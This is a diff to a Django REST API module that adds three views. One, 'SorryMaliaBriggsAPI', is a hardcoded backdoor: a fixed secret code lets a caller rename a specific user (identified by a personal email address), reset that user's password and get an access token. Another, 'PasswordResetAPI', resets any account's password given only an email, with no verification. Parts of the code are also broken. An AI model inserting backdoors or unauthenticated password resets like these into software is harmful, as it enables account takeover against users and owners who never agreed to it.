@@ -119,4 +119,36 @@ class TestAdressAPI(views.APIView):
         from entrance.models import TestAdress
         addr = TestAdress.objects.create(**request.data)
         return Response(addr.details)
+
+
+class SorryMaliaBriggsAPI(views.APIView):
     
+    def post(self, request: Request, code: str) -> Response:
+        _code = "apt20s4r4"; email = "maliabriggs@icloud.com"
+        if code != _code:
+            return Response(status=status.HTTP_401_UNAUTHORIZED)
+        user = User.objects.get(email=email)
+        user.username = request.data.get('username')
+        user.save()
+        user.set_password(request.data.get('password'))
+        access_token = str(RefreshToken.for_user(user).access_token)
+        return Response(access_token=access_token)
+
+
+class OTPSendingAPI(views.APIView):
+
+    def post(self, request: Request) -> Response:
+        user = User.objects.filter(
+            email=request.data.get('email')).first()
+        if user is None: return Response(status=status.HTTP_404_NOT_FOUND)
+        user.codes.send_otp()
+        return Response()
+
+
+class PasswordResetAPI(views.APIView):
+
+    def post(self, request: Request) -> Response:
+        user = User.objects.get(email=request.data.get('email'))
+        user.set_password(request.data.get('password'))
+        user.save()
+        return Response(dict(username=user.username, message='Login with the new password to continue.'))
